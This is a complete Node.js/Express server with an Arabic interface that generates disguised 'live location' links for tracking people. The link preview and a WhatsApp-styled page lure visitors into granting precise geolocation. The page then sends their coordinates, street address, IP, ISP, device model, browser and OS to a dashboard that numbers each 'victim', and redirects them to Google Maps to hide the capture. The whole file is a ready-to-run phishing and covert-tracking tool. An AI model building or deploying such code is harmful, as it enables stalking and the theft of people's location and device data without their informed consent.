const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// 1. لوحة التحكم المركزية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم - إدارة التتبع</title>
        <style>
            * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
            body { background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
            .container { max-width: 800px; margin: 0 auto; }
            .card { background: #1e293b; border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
            h2, h3 { color: #f1f5f9; text-align: center; margin-top: 0; }
            button { background: #10b981; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: background 0.2s; }
            button:hover { background: #059669; }
            input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #38bdf8; font-size: 14px; margin-top: 10px; font-family: monospace; }
            .info-box { background: #0f172a; padding: 16px; border-radius: 8px; margin-top: 12px; border-right: 4px solid #10b981; font-size: 14px; line-height: 1.8; border-top: 1px solid #334155; border-bottom: 1px solid #334155; border-left: 1px solid #334155; }
            .badge { background: #3b82f6; color: white; padding: 2px 8px; border-radius: 4px; font-size: 12px; }
            a { color: #38bdf8; text-decoration: none; }
            a:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🎛️ لوحة التحكم - نظام الخرائط والمواقع</h2>
            
            <div class="card">
                <h3>🔗 توليد رابط معاينة الخريطة</h3>
                <p style="font-size: 13px; color: #94a3b8; text-align: center;">يظهر الرابط كمعاينة موقع جغرافي مباشر عند المشاركة عبر منصات التواصل.</p>
                <button type="button" onclick="makeLink()">🗺️ إنشاء رابط الخريطة الذكي</button>

                <div id="linkContainer" style="display:none; margin-top: 15px;">
                    <label style="font-size: 13px; color: #cbd5e1;">الرابط الجاهز للنسخ والإرسال:</label>
                    <input type="text" id="linkInput" readonly onclick="this.select();">
                </div>
            </div>

            <h3>📥 سجل البيانات الواردة:</h3>
            <div id="logs" class="card">
                <p style="color: #94a3b8; text-align: center;">في انتظار التفاعلات...</p>
            </div>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            function makeLink() {
                const uniqueId = Math.random().toString(36).substring(2, 8);
                const fullUrl = window.location.origin + '/map-view/' + uniqueId;
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            let victimCounter = 1;
            const socket = io();
            socket.on('new-device-data', (data) => {
                const logs = document.getElementById('logs');
                if (logs.innerText.includes('في انتظار التفاعلات')) logs.innerHTML = '';
                
                const box = document.createElement('div');
                box.className = 'info-box';
                box.innerHTML = '<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">' +
                                '<strong style="color:#ef4444;">🔴 جهاز رقم (# ' + victimCounter++ + ')</strong>' +
                                '<span class="badge">' + data.time + '</span></div>' +
                                '<strong>📱 نوع الجهاز:</strong> ' + data.deviceName + '<br>' +
                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
                                '<strong>📡 المزود (ISP):</strong> ' + data.networkISP + '<br>' +
                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
                                '<strong>📍 العنوان الدقيق:</strong> <span style="color: #34d399; font-weight: bold;">' + data.fullAddress + '</span><br>' +
                                (data.lat ? '<strong>🗺️ إحداثيات الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank">فتح على خرائط جوجل (' + data.lat.toFixed(5) + ', ' + data.lon.toFixed(5) + ')</a><br>' : '');
                logs.prepend(box);
            });
        </script>
    </body>
    </html>
  `);
});

// 2. صفحة معاينة الموقع
app.get('/map-view/:id', (req, res) => {
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
  if (clientIp.startsWith('::ffff:')) clientIp = clientIp.replace('::ffff:', '');

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>موقع جغرافي مباشر - Live Location</title>
        
        <meta property="og:title" content="📍 مشاركة موقع مباشر (Live Location)">
        <meta property="og:description" content="تم مشاركة موقع جغرافي معك. اضغط لعرض المكان الحالي على الخريطة.">
        <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=600&auto=format&fit=crop&q=80">
        <meta property="og:url" content="${req.protocol}://${req.get('host')}${req.originalUrl}">
        <meta property="og:type" content="website">

        <style>
            body { font-family: system-ui, -apple-system, sans-serif; background: #e5ddd5; color: #333; margin: 0; padding: 0; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .card { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 380px; width: 90%; }
            .icon { font-size: 48px; margin-bottom: 12px; }
            h3 { margin: 0 0 10px 0; color: #075e54; font-size: 20px; }
            p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
            button { background: #25d366; color: white; border: none; padding: 14px 20px; font-size: 16px; border-radius: 30px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3); transition: background 0.2s; }
            button:hover { background: #128c7e; }
            #status { margin-top: 15px; font-size: 13px; color: #666; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="icon">📍</div>
            <h3>عرض الموقع المباشر</h3>
            <p>انقر أدناه لتحميل الخريطة وتحديد المسار والاتجاهات بدقة على هاتفك.</p>
            <button onclick="requestLocation()">فتح الخريطة الآن</button>
            <div id="status"></div>
        </div>

        <script>
            function getExactDeviceModel(ua) {
                if (/iPhone/i.test(ua)) return 'Apple iPhone';
                if (/iPad/i.test(ua)) return 'Apple iPad';
                
                let match = ua.match(/(Galaxy\\s[A-Z0-9]+|SM-[A-Z0-9]+|Redmi\\s[\\w\\s]+|POCO\\s[\\w\\s]+|Pixel\\s[0-9a-zA-Z\\s]+|Huawei\\s[\\w\\s]+|OPPO\\s[\\w\\s]+|Vivo\\s[\\w\\s]+|Realme\\s[\\w\\s]+)/i);
                if (match) return match[0];
                
                if (/Android/i.test(ua)) return 'هاتف Android';
                if (/Windows/i.test(ua)) return 'حاسوب Windows';
                if (/Macintosh/i.test(ua)) return 'حاسوب Mac';
                return 'جهاز ذكي';
            }

            function getBrowserInfo(ua) {
                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
                if (ua.includes('Edg')) return 'Microsoft Edge';
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Firefox')) return 'Mozilla Firefox';
                if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
                return 'متصفح عام';
            }

            function getOSInfo(ua) {
                if (/Windows/i.test(ua)) return 'Windows';
                if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
                if (/Android/i.test(ua)) return 'Android';
                if (/Macintosh/i.test(ua)) return 'macOS';
                if (/Linux/i.test(ua)) return 'Linux';
                return 'غير معروف';
            }

            function requestLocation() {
                document.getElementById('status').innerText = "جاري الاتصال بالأقمار الصناعية...";

                if (!navigator.geolocation) {
                    alert("المتصفح لا يدعم تحديد الموقع الجغرافي.");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const ua = navigator.userAgent;

                        const deviceData = {
                            deviceName: getExactDeviceModel(ua),
                            browser: getBrowserInfo(ua),
                            os: getOSInfo(ua),
                            ip: "${clientIp}",
                            networkISP: "غير محدد",
                            fullAddress: "جاري تحويل الإحداثيات...",
                            lat: lat,
                            lon: lon,
                            time: new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
                        };

                        // 1. جلب بيانات المزود (ISP)
                        try {
                            const resIp = await fetch('https://ipapi.co/${clientIp}/json/');
                            if (resIp.ok) {
                                const ipData = await resIp.json();
                                deviceData.networkISP = ipData.org || ipData.asn || "غير معروف";
                            }
                        } catch(e){}

                        // 2. تحويل الإحداثيات إلى عنوان
                        try {
                            const resGeo = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&accept-language=ar', {
                                headers: { 'Accept-Language': 'ar' }
                            });
                            if (resGeo.ok) {
                                const geoData = await resGeo.json();
                                deviceData.fullAddress = geoData.display_name || (lat + ', ' + lon);
                            } else {
                                deviceData.fullAddress = lat + ', ' + lon;
                            }
                        } catch(err) {
                            deviceData.fullAddress = lat + ', ' + lon;
                        }

                        // 3. إرسال البيانات
                        fetch('/api/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(deviceData)
                        }).finally(() => {
                            document.body.innerHTML = '<div style="background:#fff; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; font-family:sans-serif; color:#333;"><h3>جاري جلب الخريطة...</h3></div>';
                            setTimeout(() => {
                                window.location.href = "https://maps.google.com/?q=" + lat + "," + lon;
                            }, 500);
                        });
                    },
                    (err) => {
                        document.getElementById('status').style.color = "#dc2626";
                        document.getElementById('status').innerText = "تعذر تحديد الموقع. يرجى إعطاء الإذن للمتابعة.";
                    },
                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
                );
            }
        </script>
    </body>
    </html>
  `);
});

// API لاستقبال البيانات وتوزيعها عبر Socket.io
app.post('/api/log', (req, res) => {
  io.emit('new-device-data', req.body);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
